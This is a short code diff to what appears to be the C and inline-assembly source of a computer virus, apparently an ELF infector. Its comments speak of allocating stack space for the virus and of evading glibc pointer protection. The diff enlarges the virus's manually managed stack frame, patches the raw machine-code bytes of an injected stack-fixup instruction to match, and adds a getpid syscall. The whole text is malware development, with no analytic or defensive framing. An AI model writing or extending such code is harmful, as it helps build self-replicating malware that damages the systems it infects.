@@ -13,6 +13,7 @@
 #define SYS_LSEEK	8
 #define SYS_EXIT	60
 #define SYS_PTRACE	101
+#define SYS_GETPID	39
 #define _exit(x) 		syscall1(SYS_EXIT, (long)(x))
 #define read(fd, buf, len) 	syscall3(SYS_READ, (long)fd, (long)(buf), (long)len)
 #define write(fd, buf, len) 	syscall3(SYS_WRITE, (long)fd, (long)(buf), (long)len)
@@ -149,7 +150,7 @@ void _start(void)
 {
 	__asm__ __volatile__ (
 		/* handle stack manually.... yes this is fight agains compiler :( */
-		"add $0x2e8, %rsp\n" 
+		"add $0x318, %rsp\n"
 		/* This is needed because if I don't do it,
 		 * then I will crash to glibc pointer protection.
 		 */
@@ -162,7 +163,7 @@ void _start(void)
 		"pushq %rbp\n"
 
 		/* allocate spack space for virus */
-		"sub $0x2e8, %rsp\n"
+		"sub $0x318, %rsp\n"
 	);
 
 	char a[5];
@@ -197,8 +198,8 @@ void _start(void)
 	jmp[0] = '\x48'; 
 	jmp[1] = '\x81';
 	jmp[2] = '\xc4';
-	jmp[3] = '\xe8';
-	jmp[4] = '\x02';
+	jmp[3] = '\x18';
+	jmp[4] = '\x03';
 	jmp[5] = '\x00';
 	jmp[6] = '\x00';
 
